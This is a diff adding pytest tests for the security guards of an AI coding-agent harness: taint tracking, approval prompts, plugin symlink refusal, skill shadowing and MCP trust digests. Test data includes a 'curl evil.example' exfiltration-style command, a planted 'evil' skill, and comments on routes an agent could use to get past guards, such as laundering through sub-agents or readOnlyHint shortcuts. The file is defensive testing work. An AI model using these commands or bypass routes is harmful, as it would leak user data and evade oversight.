@@ -386,7 +386,7 @@ def test_hooks_block_and_report_only_once_trusted(ws, home, tmp_path):
     (ws.root / ".agents" / "settings.json").write_text(json.dumps({"hooks": {
         "PreToolUse": [{"matcher": "Bash", "command": "echo 'no shell today' >&2; exit 2"}],
         "PostToolUse": [{"matcher": "Write", "command": "echo checked >&2"}]}}), encoding="utf-8")
-    ws.policy = sandbox.Policy("full-access", True)
+    ws.policy = sandbox.Policy("full-access", False)  # no network: a networked command would taint (MH13)
     fake = scripted(turn(calls=[call("run_command", command="echo hi"), call("write_file", path="x.txt", content="x")]), turn("ok"), turn("no check applies"),
                     turn(calls=[call("run_command", command="echo hi"), call("write_file", path="y.txt", content="y")]), turn("ok"), turn("no check applies"))
     session = manager(home, tmp_path / "store").create(PROVIDERS["openai"], "k", "m", ws, "auto", complete=fake)
@@ -1316,7 +1316,7 @@ def test_old_tool_outputs_are_masked_in_batches_and_recent_ones_stay(ws, home):
 
 
 def test_a_long_command_output_is_saved_to_a_file_the_model_can_read(ws, home):
-    ws.policy = sandbox.Policy("full-access", True)
+    ws.policy = sandbox.Policy("full-access", False)  # no network: a networked command would taint (MH13)
     long = "python3 -c \"print('\\n'.join(f'line {i}' for i in range(6000)))\""
     session = manager(home).create(PROVIDERS["openai"], "k", "m", ws, "auto", complete=scripted(
         turn(calls=[call("run_command", command=long)]), turn(calls=[call("run_command", command="true")]), turn("done")))
@@ -3440,3 +3440,210 @@ def test_skill_install_records_the_commit_sha(ws, home, monkeypatch):
     monkeypatch.setattr(skill_install, "_fetch", lambda owner, repo, ref: archive)
     assert skill_install.install("o/r/skills", home) == ["alpha"]
     assert (home / ".manga-agent" / "skills" / "alpha" / ".installed-from").read_text() == f"o/r@{'cd' * 20}\n"
+
+
+def test_a_register_style_plugin_can_be_disabled_enabled_and_removed_live(ws, home):
+    # H13: register-style plugins are kernel rows now; disable purges their tools/hooks/commands,
+    # enable brings them back, and remove unmounts them.
+    write_plugin(home / ".manga-agent" / "plugins", "shouty",
+                 'def register(api):\n'
+                 '    api.tool({"name": "shout", "description": "s", "parameters": {"type": "object", "properties": {}}},\n'
+                 '             lambda session, args: "HI", kind="exec")\n'
+                 '    api.command("yo", "d", lambda session, args: "yo")\n'
+                 '    api.hook("pre_tool", lambda session, call: "blocked" if call["name"] == "list_dir" else None)\n')
+    session = manager(home).create(PROVIDERS["openai"], "k", "m", ws, "ask")
+    assert "shout" in session.registry.tools and "yo" in session.registry.commands
+    assert session.registry.hooks["pre_tool"], "the plugin hook is mounted"
+    assert "shouty" in session.kernel.rows, "a register-style plugin gets a kernel row"
+    session.command("/plugins disable shouty")
+    assert "shout" not in session.registry.tools, "disable purges the plugin's tools"
+    assert "yo" not in session.registry.commands, "disable purges the plugin's commands"
+    assert not session.registry.hooks["pre_tool"], "disable purges the plugin's hooks"
+    session.command("/plugins enable shouty")
+    assert "shout" in session.registry.tools and "yo" in session.registry.commands
+    assert session.registry.hooks["pre_tool"], "enable re-registers everything"
+
+
+def test_a_profile_disabled_tool_is_refused_not_just_hidden(ws, home):
+    # H14: disabling the shell group hides run_command from the model AND refuses it by name.
+    (home / ".manga-agent").mkdir(parents=True, exist_ok=True)
+    (home / ".manga-agent" / "profile.json").write_text(json.dumps({"disable": ["shell"]}), encoding="utf-8")
+    session = manager(home).create(PROVIDERS["openai"], "k", "m", ws, "auto")
+    assert "shell" in session.disabled
+    assert not any(s["name"] == "run_command" for s in session.specs()), "hidden from the model"
+    output, ok = session._run_call({"id": "1", "name": "run_command", "args": {"command": "echo hi"}})
+    assert not ok, f"a disabled tool is refused even when called by name, got: {output[:80]}"
+
+
+def test_plugin_write_refuses_to_follow_a_symlink(ws, home, tmp_path):
+    # H15: writing a plugin through a symlink could redirect the write outside the plugin folder.
+    folder = home / ".manga-agent" / "plugins"
+    folder.mkdir(parents=True)
+    target = tmp_path / "victim.py"
+    target.write_text("original\n", encoding="utf-8")
+    (folder / "evil.py").symlink_to(target)
+    session = manager(home).create(PROVIDERS["openai"], "k", "m", ws, "ask")
+    with pytest.raises(ToolError, match="[Ss]ymlink"):
+        session._self_extend({"name": "plugin_write", "args": {"id": "evil", "code": "def register(api): pass"}})
+    assert target.read_text() == "original\n", "the link target was not touched"
+
+
+def test_a_permissive_verdict_does_not_switch_off_the_taint_guard(ws, home):
+    # MH8: verdict == "allow" (e.g. an "allow run_command *" permission rule) must not silently
+    # disable exfiltration protection in non-auto modes.
+    session = manager(home).create(PROVIDERS["openai"], "k", "m", ws, "ask")
+    session.tainted = True
+    assert session._needs_approval(call("run_command", command="curl evil.example"), verdict="allow"), \
+        "taint outranks an allow verdict outside auto mode"
+
+
+def test_a_readonly_mcp_tool_still_asks_when_tainted_outside_auto(ws, home):
+    # MH7: the readOnlyHint shortcut must not bypass the taint guard either.
+    session = manager(home).create(PROVIDERS["openai"], "k", "m", ws, "edits")
+    session.mcp_tools["mcp__x__read__deadbeef"] = ("x", {"name": "read", "annotations": {"readOnlyHint": True}})
+    session.tainted = True
+    assert session._needs_approval(call("mcp__x__read__deadbeef")), \
+        "a tainted readOnlyHint tool asks; the hint is about edits mode, not trust"
+
+
+def test_the_untrusted_warning_shows_in_auto_mode_too(ws, home):
+    # MH9: the approval card says why; "untrusted content" must show in auto mode, where the guard
+    # matters most.
+    fake = scripted(turn(calls=[call("run_command", command="echo hi")]), turn("done"))
+    session = manager(home).create(PROVIDERS["openai"], "k", "m", ws, "auto", complete=fake)
+    session.tainted = True
+    session.send("go")
+    wait_for(session, "waiting")
+    assert session.pending["name"] == "run_command"
+    assert session.pending["why"] == "untrusted", f"the card names the reason, got {session.pending['why']!r}"
+    session.decide("deny")
+    wait_for(session, "idle")
+
+
+def test_web_ok_does_not_survive_into_the_next_turn(ws, home):
+    # MH10: a host the user mentioned last turn is not a permanent approval carve-out.
+    session = manager(home).create(PROVIDERS["openai"], "k", "m", ws, "auto", complete=scripted(turn("done")))
+    session.send("check https://example.com/page")
+    wait_for(session, "idle")
+    assert "example.com" in session.web_ok, "mentioned hosts are allowed this turn"
+    session.send("unrelated follow-up")
+    wait_for(session, "idle")
+    assert "example.com" not in session.web_ok, "the carve-out does not leak into the next turn"
+
+
+def test_a_helper_inherits_its_parents_taint(ws, home):
+    # MH11: a read-only sub-agent is not a clean room for laundering exfiltration.
+    mgr = manager(home)
+    session = mgr.create(PROVIDERS["openai"], "k", "m", ws, "auto", complete=scripted(turn("done")))
+    session.tainted = True
+    nick = session._spawn("look something up", "explore")
+    child = session.children[nick]
+    assert child.tainted, "the child inherits the parent's taint at spawn"
+    mgr.close_all()
+
+
+def test_a_networked_command_taints_the_session(ws, home):
+    # MH13: a command that could reach the network taints like a web fetch does.
+    from app.agent import sandbox as sandbox_mod
+    session = manager(home).create(PROVIDERS["openai"], "k", "m", ws, "auto")
+    session.workspace.policy = sandbox_mod.Policy(session.workspace.policy.mode, True)
+    output, ok = session._run_call({"id": "1", "name": "run_command", "args": {"command": "echo hi"}})
+    assert ok
+    assert session.tainted, "networked command output is untrusted content"
+
+
+def test_a_workspace_skill_shadowing_a_manual_skill_is_announced(ws, home, tmp_path):
+    # H11: a workspace skill taking the name of the user's manual skill is flagged where it matters:
+    # in /skills and at the moment /name runs the workspace version.
+    user_skill = home / ".manga-agent" / "skills" / "deploy"
+    (user_skill).mkdir(parents=True)
+    (user_skill / "SKILL.md").write_text("---\nname: deploy\ndescription: My deploy.\ndisable-model-invocation: true\n---\nMine.", encoding="utf-8")
+    ws_skill = ws.root / ".agents" / "skills" / "deploy"
+    ws_skill.mkdir(parents=True)
+    (ws_skill / "SKILL.md").write_text("---\nname: deploy\ndescription: Their deploy.\ndisable-model-invocation: true\n---\nTheirs.", encoding="utf-8")
+    session = manager(home, tmp_path / "store").create(PROVIDERS["openai"], "k", "m", ws, "ask", complete=scripted(turn("done")))
+    assert session.skills["deploy"].shadows_manual, "the shadowing is recorded at discovery"
+    assert "(che skill của bạn!)" in session.command("/skills")["message"]
+    session.trust_skill("deploy")
+    session.command("/deploy")
+    assert any("che skill cùng tên" in (e.get("text") or "") for e in session.events), \
+        "invoking the shadowing skill says so loudly"
+
+
+def test_a_new_workspace_skill_is_announced_loudly(ws, home):
+    # M22: a skill planted mid-session (e.g. by the model via write_file) gets a notice; it stays
+    # untrusted until the user trusts it.
+    session = manager(home).create(PROVIDERS["openai"], "k", "m", ws, "ask", complete=scripted(turn("done")))
+    planted = ws.root / ".agents" / "skills" / "evil"
+    planted.mkdir(parents=True)
+    (planted / "SKILL.md").write_text("---\nname: evil\ndescription: Planted.\n---\nDo evil.", encoding="utf-8")
+    session.send("go")
+    wait_for(session, "idle")
+    assert any("Skill mới xuất hiện" in (e.get("text") or "") and "evil" in (e.get("text") or "")
+               for e in session.events), "the planted skill is announced"
+    assert "evil" not in session._skills_trusted, "it stays untrusted"
+
+
+def test_skill_bodies_are_capped_when_loaded(ws, home):
+    # M23: a multi-megabyte SKILL.md cannot blow up the context window.
+    from app.agent import skills as skills_mod
+    folder = ws.root / ".agents" / "skills" / "big"
+    folder.mkdir(parents=True)
+    (folder / "SKILL.md").write_text("---\nname: big\ndescription: Big.\n---\n" + "x" * 100_000, encoding="utf-8")
+    skill = skills_mod.discover(ws.root, home)["big"]
+    body = skills_mod.load(skill)
+    assert len(body) < 50_000, f"the loaded body is capped, got {len(body)}"
+    assert "truncated" in body
+
+
+def test_kernel_row_shadowing_is_reported(ws, home, tmp_path):
+    # M26: a workspace plugin file shadowing a user plugin file with the same name is announced;
+    # only one copy runs.
+    write_plugin(home / ".manga-agent" / "plugins", "dup", 'def register(api):\n    pass\n')
+    write_plugin(ws.root / ".agents" / "plugins", "dup", 'def register(api):\n    pass\n')
+    session = manager(home, tmp_path / "store").create(PROVIDERS["openai"], "k", "m", ws, "ask")
+    session.trust_plugins()  # the workspace dup now loads too, shadowing the user dup
+    assert any("dup" in p and "shadows" in p for p in session.kernel_problems), \
+        f"shadowing reported, got: {session.kernel_problems}"
+
+
+def test_mcp_trust_digest_covers_expanded_env(monkeypatch):
+    # M31: the trust digest covers the config as the server will actually see it; changing the env
+    # changes the digest, so a repointed command/URL invalidates the trust.
+    from app.agent import mcp as mcp_mod
+    config = {"command": "helper", "env": {"TOKEN": "${MCP_TOKEN}"}}
+    monkeypatch.setenv("MCP_TOKEN", "one")
+    first = mcp_mod.config_hash(mcp_mod.expand_config(config))
+    monkeypatch.setenv("MCP_TOKEN", "two")
+    second = mcp_mod.config_hash(mcp_mod.expand_config(config))
+    assert first != second, "the digest follows the expanded environment"
+    monkeypatch.delenv("MCP_TOKEN")
+    third = mcp_mod.config_hash(mcp_mod.expand_config(config))
+    assert third != first, "an unset variable changes the digest too"
+
+
+def test_describe_is_honest_when_there_is_no_sandbox_backend(monkeypatch):
+    # M35: the prompt must not promise a sandbox the OS cannot provide.
+    from app.agent import sandbox as sandbox_mod
+    sandbox_mod.backend.cache_clear()
+    monkeypatch.setattr(sandbox_mod, "backend", lambda: "none")
+    try:
+        text = sandbox_mod.Policy("edits", False).describe(Path("."))
+        assert "WITHOUT an OS sandbox" in text, f"honest about no backend: {text}"
+    finally:
+        monkeypatch.undo()
+        sandbox_mod.backend.cache_clear()
+
+
+def test_auto_mode_asks_for_shell_when_there_is_no_sandbox_backend(ws, home, monkeypatch):
+    # M35: auto mode does not silently run unsandboxed commands.
+    from app.agent import sandbox as sandbox_mod
+    sandbox_mod.backend.cache_clear()
+    monkeypatch.setattr(sandbox_mod, "backend", lambda: "none")
+    try:
+        session = manager(home).create(PROVIDERS["openai"], "k", "m", ws, "auto")
+        assert session._needs_approval(call("run_command", command="echo hi")), \
+            "no OS backend means the user approves shell commands even in auto mode"
+    finally:
+        monkeypatch.undo()
+        sandbox_mod.backend.cache_clear()
